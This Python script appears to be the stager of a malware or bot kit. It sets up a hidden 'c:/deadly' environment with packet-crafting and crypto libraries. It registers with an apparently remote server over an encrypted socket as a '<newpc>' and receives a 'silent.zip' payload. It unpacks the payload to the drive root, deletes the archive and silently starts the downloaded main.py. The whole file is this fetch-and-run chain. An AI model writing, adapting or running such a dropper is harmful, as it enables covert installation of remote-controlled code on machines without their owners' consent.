import os
import time
import zipfile
import subprocess


def main():
    os.makedirs('c:/deadly')
    os.chdir('c:/deadly')
    os.popen('python -m venv myenv').read()
    os.chdir('myenv/Scripts')
    os.popen('activate').read()
    os.chdir('c:/deadly')
    packages = ['scapy==2.5', 'rsa', 'PyCryptodome', 'tqdm']
    for package in packages:
        subprocess.check_call(['pip', 'install', package])
    print("All packages installed")
    import FileTransfer
    transfered = False
    while(not transfered):
        client_socket, encryption_key = FileTransfer.initiate()
        try:
            client_socket.send(FileTransfer.encrypt('<newpc>'.encode(), encryption_key))
            data = FileTransfer.decrypt(client_socket.recv(1024), encryption_key).decode()
            print(data)
            FileTransfer.receive(client_socket, encryption_key, data, 'c:/')
            transfered = True
        except:
            pass
        finally:
            while(client_socket.recv(1024)):
                pass
            client_socket.close()

    with zipfile.ZipFile('c:/silent.zip', 'r') as zip:
        zip.extractall('c:/')
    if os.path.isfile('c:/silent.zip'):
        os.remove('c:/silent.zip')
    os.chdir('c:/deadly/')
    os.popen('start python c:/deadly/main.py')


if __name__ == '__main__':
    main()
